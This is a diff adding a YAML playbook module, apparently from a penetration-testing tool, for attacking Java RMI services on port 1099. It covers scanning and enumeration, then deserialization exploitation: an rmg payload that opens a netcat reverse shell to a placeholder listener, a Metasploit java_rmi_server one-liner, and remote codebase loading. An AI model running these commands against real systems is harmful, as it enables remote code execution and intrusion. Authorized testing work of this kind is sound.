@@ -1,0 +1,63 @@
+module: rmi
+name: Java RMI (1099)
+inputs: [OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / RMI registry
+        commands: |
+          nmap -p$PORT -sV -sC $IP
+          nmap -p$PORT --script=rmi-dumpregistry $IP
+      - id: dump
+        text: Dump registry (bound objects + remote interfaces)
+        commands: |
+          nmap -p$PORT --script=rmi-dumpregistry $IP
+          java -jar remote-method-guesser.jar enum $IP $PORT
+
+  - id: enum
+    name: Enumeration
+    steps:
+      - id: rmg_enum
+        text: Full enum with remote-method-guesser (rmg)
+        commands: |
+          rmg enum $IP $PORT
+          rmg enum $IP $PORT --ssrf
+      - id: barmie
+        text: Enumerate + attack surface with BaRMIe
+        commands: |
+          java -jar BaRMIe.jar -enum $IP $PORT
+      - id: guess_methods
+        text: Guess remote methods on bound objects
+        commands: |
+          rmg guess $IP $PORT
+
+  - id: vuln
+    name: Vulnerability Identification
+    steps:
+      - id: deser_check
+        text: Check for insecure deserialization / known RMI CVEs
+        commands: |
+          rmg serial $IP $PORT CommonsCollections6 "id"
+          searchsploit java rmi
+
+  - id: exploit
+    name: Deserialization RCE
+    authorized: true
+    steps:
+      - id: ysoserial
+        text: Deserialization gadget via rmg (ysoserial payloads)
+        commands: |
+          rmg serial $IP $PORT CommonsCollections6 "nc <LHOST> <LPORT> -e /bin/sh"
+      - id: msf_rmi
+        text: RMI registry / default-config RCE via Metasploit
+        commands: |
+          msfconsole -qx "use exploit/multi/misc/java_rmi_server; set RHOSTS $IP; set RPORT $PORT; run; exit"
+      - id: codebase
+        text: Codebase (remote class loading) exploitation
+        manual: true
+        commands: |
+          # rmg serial ... with a malicious codebase URL if useCodebaseOnly=false
